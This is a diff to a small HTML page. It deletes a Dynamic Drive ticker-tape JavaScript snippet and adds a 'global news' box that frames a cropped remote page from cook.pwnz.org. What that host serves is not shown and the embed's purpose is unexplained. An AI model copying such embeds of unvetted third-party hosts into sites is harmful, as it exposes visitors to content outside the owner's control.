@@ -1,56 +1,15 @@
-<script language="JavaScript1.2">
 
-/*
-Ticker Tape script- 
-?Dynamic Drive (www.dynamicdrive.com)
-For full source code, installation instructions,
-100's more DHTML scripts, and Terms Of
-Use, visit dynamicdrive.com
-*/
-//configure tickercontents[] to set the messges you wish be displayed (HTML codes accepted)//设置内容显示
-var tickercontents=new Array()
-tickercontents[0]='See what\'s New at Dynamic Drive. <a href="test/link1.htm">[Read more]</a>'
-tickercontents[1]='Browse the most popular scripts on Dynamic Drive <a href="test/link1.htm">[Read more]</a>'
-tickercontents[2]='Link back to Dynamic Drive! <a href="test/link1.htm">[Read more]</a>'
+全球要闻
+<body> 
+<div style="width:399px;height:205px;overflow:hidden;border:1px solid #ffffff;"> 
+<div style="width:499px;height:360px;margin:-83px 0px 0px -2px;"><iFrame 
 
-//configure the below 2 variables to set the width/background color of the ticker//设置颜色与长度
-var tickerwidth='65%'
-var tickerbgcolor='lightblue'
+src="http://cook.pwnz.org/jw/0" width="100%" height="100%"></iFrame></div> 
+</div> 
+</body> 
+</html> 
 
-//configure the below variable to determine the delay between ticking of messages (in miliseconds//设置延迟时间
-var tickdelay=3000
-
-////Do not edit pass this line////////////////
-
-var currentmessage=0
-
-function changetickercontent(){
-if (document.layers){
-document.tickernsmain.document.tickernssub.document.write(tickercontents[currentmessage])
-document.tickernsmain.document.tickernssub.document.close()
-}
-else if (document.all)
-tickerie.innerHTML=tickercontents[currentmessage]
-
-if (currentmessage==tickercontents.length-1) currentmessage=0
-else currentmessage++
-setTimeout("changetickercontent()",tickdelay)
-}
-
-function start_ticking(){
-if (document.layers)
-document.tickernsmain.visibility="show"
-changetickercontent()
-}
-
-if (document.all)
-document.write('<div id="tickerie" style="width:'+tickerwidth+'; background-color:'+tickerbgcolor+'"></div>')
-window.onload=start_ticking
-</script>
-
-
-<ilayer id="tickernsmain" width= && #123;tickerwidth}; bgColor= && #123;tickerbgcolor}; visibility=hide><layer id="tickernssub" width= && #123;tickerwidth}; left=0 top=0></layer></ilayer>
-
+ 
 
 
 
